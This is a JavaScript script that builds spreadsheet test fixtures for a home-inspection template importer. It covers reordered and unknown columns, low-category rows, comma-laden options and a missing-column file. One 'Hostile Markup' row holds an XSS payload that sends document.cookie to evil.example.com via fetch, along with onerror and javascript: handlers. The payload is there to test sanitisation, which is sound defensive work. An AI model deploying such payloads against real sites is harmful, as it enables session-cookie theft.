/**
 * Builds the hand-made export variant used by the parser tests.
 *
 *   node ai/scripts/make-variant-fixture.mjs
 *
 * Two jobs. First, it proves the importer is not hardcoded to the InterNACHI
 * file: different sections, different items, a different column order, and an
 * extra column the importer has never seen. Second, it covers what the real
 * export happens not to contain — a Category of -1, and hostile HTML in a
 * comment cell — so those paths are tested rather than assumed.
 */
import { writeFileSync, mkdirSync } from 'node:fs';
import XLSX from 'xlsx';

// Deliberately not the real file's column order: columns are matched by header
// name, so a reshuffled export must still import.
const HEADER = [
  'Item Name',
  'Section Name',
  'Comment Name',
  'Comment Type (info, limit, defect)',
  'Category (-1: Low, 0: Med, 1: High)',
  'Comment Text',
  'Answer Type (boolean, checkbox, date, number, range, text)',
  'Multiple Choice Options (comma-separated)',
  'Unit Type Options (numeric answers only, comma-separated)',
  'Recommendation (from list)',
  'Order (w/i item)',
  'Default Estimate Min',
  'Default Estimate Max',
  'Inspector Mood', // Unknown column: must be reported, not silently ignored.
];

const row = (values) => HEADER.map((h) => values[h] ?? '');

const ROWS = [
  // Category -1: the low path, which has no rows in the real export.
  row({
    'Section Name': 'Structure',
    'Item Name': 'Foundation',
    'Comment Name': 'Hairline Cracking',
    'Comment Type (info, limit, defect)': 'defect',
    'Category (-1: Low, 0: Med, 1: High)': '-1',
    'Comment Text': '<p>Hairline cracks noted. <strong>Monitor</strong> over time.</p>',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'boolean',
    'Order (w/i item)': '0',
    'Default Estimate Min': '250',
    'Default Estimate Max': '900',
    'Inspector Mood': 'cheerful',
  }),
  // The other two categories, so all three map in one file.
  row({
    'Section Name': 'Structure',
    'Item Name': 'Foundation',
    'Comment Name': 'Step Cracking',
    'Comment Type (info, limit, defect)': 'defect',
    'Category (-1: Low, 0: Med, 1: High)': '0',
    'Comment Text': '<p>Step cracking at the north corner.</p>',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'boolean',
    'Order (w/i item)': '1',
    'Default Estimate Min': '1200',
    'Default Estimate Max': '4000',
  }),
  row({
    'Section Name': 'Structure',
    'Item Name': 'Foundation',
    'Comment Name': 'Displacement',
    'Comment Type (info, limit, defect)': 'defect',
    'Category (-1: Low, 0: Med, 1: High)': '1',
    'Comment Text': '<p>Measurable displacement. Structural engineer recommended.</p>',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'boolean',
    'Recommendation (from list)': 'pro',
    'Order (w/i item)': '2',
    'Default Estimate Min': '5000',
    'Default Estimate Max': '25000',
  }),
  // Hostile HTML reaching the importer through a real cell.
  row({
    'Section Name': 'Structure',
    'Item Name': 'Crawlspace',
    'Comment Name': 'Hostile Markup',
    'Comment Type (info, limit, defect)': 'info',
    'Comment Text':
      '<p>Vapour barrier torn.</p><script>fetch("https://evil.example.com?c="+document.cookie)</script>' +
      '<img src="x" onerror="alert(1)">' +
      '<a href="javascript:alert(2)">click</a>' +
      '<a href="https://www.nachi.org/vapor-barriers" target="_blank">reference</a>',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'boolean',
    'Order (w/i item)': '0',
  }),
  // A number with units, in a template that is not the InterNACHI one.
  row({
    'Section Name': 'Water',
    'Item Name': 'Well',
    'Comment Name': 'Flow Rate',
    'Comment Type (info, limit, defect)': 'info',
    'Comment Text': '',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'number',
    'Unit Type Options (numeric answers only, comma-separated)': 'GPM, litres/min',
    'Order (w/i item)': '0',
  }),
  // A checkbox question whose empty comment text is correct data.
  row({
    'Section Name': 'Water',
    'Item Name': 'Well',
    'Comment Name': 'Pump Type',
    'Comment Type (info, limit, defect)': 'info',
    'Comment Text': '',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'checkbox',
    'Multiple Choice Options (comma-separated)': 'Submersible, Jet, Hand, Unknown',
    'Order (w/i item)': '1',
  }),
  // An option label containing a comma with no space, which a naive split
  // on "," would shred.
  row({
    'Section Name': 'Water',
    'Item Name': 'Well',
    'Comment Name': 'Casing Size',
    'Comment Type (info, limit, defect)': 'info',
    'Comment Text': '',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'checkbox',
    'Multiple Choice Options (comma-separated)': '1 1/2", 2", Unknown',
    'Order (w/i item)': '2',
  }),
  // An entity in a section name, as Spectora writes it.
  row({
    'Section Name': 'Decks &amp; Porches',
    'Item Name': 'Railings',
    'Comment Name': 'Loose Railing',
    'Comment Type (info, limit, defect)': 'defect',
    'Category (-1: Low, 0: Med, 1: High)': '1',
    'Comment Text': '<p>Railing is loose &amp; unsafe.</p>',
    'Answer Type (boolean, checkbox, date, number, range, text)': 'boolean',
    'Order (w/i item)': '0',
  }),
];

mkdirSync('tests/fixtures', { recursive: true });

const sheet = XLSX.utils.aoa_to_sheet([HEADER, ...ROWS]);
const book = XLSX.utils.book_new();
XLSX.utils.book_append_sheet(book, sheet, 'Sheet1');
const buffer = XLSX.write(book, { type: 'buffer', bookType: 'xlsx' });
writeFileSync('tests/fixtures/hand-made-variant.xlsx', buffer);
console.log(`wrote tests/fixtures/hand-made-variant.xlsx (${buffer.length} bytes, ${ROWS.length} rows)`);

// A second file missing a required column, for the hard-error path.
const broken = XLSX.utils.aoa_to_sheet([
  ['Section Name', 'Item Name', 'Comment Name'], // no "Comment Text", no type
  ['Roof', 'Coverings', 'Granule Loss'],
]);
const brokenBook = XLSX.utils.book_new();
XLSX.utils.book_append_sheet(brokenBook, broken, 'Sheet1');
const brokenBuffer = XLSX.write(brokenBook, { type: 'buffer', bookType: 'xlsx' });
writeFileSync('tests/fixtures/missing-columns.xlsx', brokenBuffer);
console.log(`wrote tests/fixtures/missing-columns.xlsx (${brokenBuffer.length} bytes)`);
